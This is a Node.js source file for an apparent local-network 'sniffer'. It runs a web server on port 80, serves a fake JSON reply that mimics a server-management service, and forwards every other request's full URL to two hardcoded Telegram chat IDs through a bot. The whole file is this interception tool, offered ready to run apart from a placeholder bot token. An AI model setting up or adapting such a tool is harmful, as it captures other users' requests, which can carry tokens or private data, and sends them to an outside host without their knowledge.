// 2021-04
// Max Base
// https://github.com/BaseMax/LocalNetworkSniffer

const express = require('express')
const app = express()
const port = 80
const TelegramBot = require('node-telegram-bot-api');
const token = 'PUT_TOKEN_OF_YOUR_BOT';
var stringify = require('json-stringify-safe');

const bot = new TelegramBot(token, {polling: true});

// Fake response
app.get('/system/videos', (req, res) => {
  res.set('Content-Type', 'application/json')
  res.send('{"status":"success","data":{"servers":{"assigning_device_to_location_and_rack":"tNxbwaLb9S4","assigning_metadata_to_device":"IxYp5VmOJx0","assigning_monitors_to_device":"lYSHsoEk9cQ","assigning_parts_to_device":"1P5KtBWpgUY","connecting_server_to_switch":"AEUbXmbAmhc","connection_device_to_pdu":"96w_KsWcwLE","general_management":"uEvSsi7CUW4","ipmi_configuration":"bt37giallCQ","ipmi_console":"OHSzAb2v1gY","ipmi_proxy":"YhBT-gJ9v7k","power_control_configuration":"HJrnzaDMg-4","snmp_configuration":"GP3JQd8Ckzw"},"inventory":{"adding_new_device_manually":"664My6_b0Go","adding_parts":"NBjiFSgtLug","auto_discovering":"WKgKHpH5mrk","locations_management":"5N2TDjOe4RI"},"devices":{"general_network_management":"bHk1e4Ie7v4","general_pdu_management":"gwWXvE384u4"}}}')
})

app.get('*', (req, res) => {
  var fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl
  res.send('Hello World!')
  // let log = stringify(res, null, 2) + "\n" + stringify(req, null, 2) // Why comment: It's very long and cannot send to Telegram Bot
  let log = fullUrl
  bot.sendMessage(381078330, log)
  bot.sendMessage(141140708, log)
})

app.listen(port, () => {
  console.log(`Example app listening at http://localhost:${port}`)
})
